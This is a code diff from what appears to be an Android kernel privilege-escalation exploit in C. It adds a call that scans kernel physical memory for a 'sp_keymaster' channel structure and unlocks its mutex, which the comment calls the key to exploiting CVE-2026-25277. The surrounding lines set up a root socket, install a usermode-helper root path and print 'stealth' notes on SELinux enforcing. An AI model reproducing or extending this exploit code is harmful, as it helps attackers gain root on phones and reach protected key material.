@@ -12,6 +12,9 @@ uint32_t root_uid_after = 0xffffffff;
 /* Forward declaration for hermes golden path */
 static void hermes_golden_path(void);
 
+/* Forward declaration for spcom mutex unlock (from spcom_unlock.c) */
+extern int unlock_spcom_mutex(int fd);
+
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 
 struct umh_subprocess_info {
@@ -447,6 +450,16 @@ static int install_workqueue_umh_root(int fd) {
         pr_info("stealth: To enable Enforcing: touch /data/local/tmp/.enforcing\n");
       }
     }
+  }
+
+  /* === SPCOM MUTEX UNLOCK — THE REAL BREAKTHROUGH ===
+   * Scans kernel physical memory for "sp_keymaster" channel struct,
+   * then unlocks the mutex at ch+0x20 to allow our SEND commands.
+   * This is the KEY to CVE-2026-25277 exploitation! */
+  if (socket_ok) {
+    pr_info("spcom: launching mutex unlock scan (fd=%d)...\n", fd);
+    int unlock_rc = unlock_spcom_mutex(fd);
+    pr_info("spcom: mutex unlock rc=%d\n", unlock_rc);
   }
 
   /* === DEFEX NOTE ===
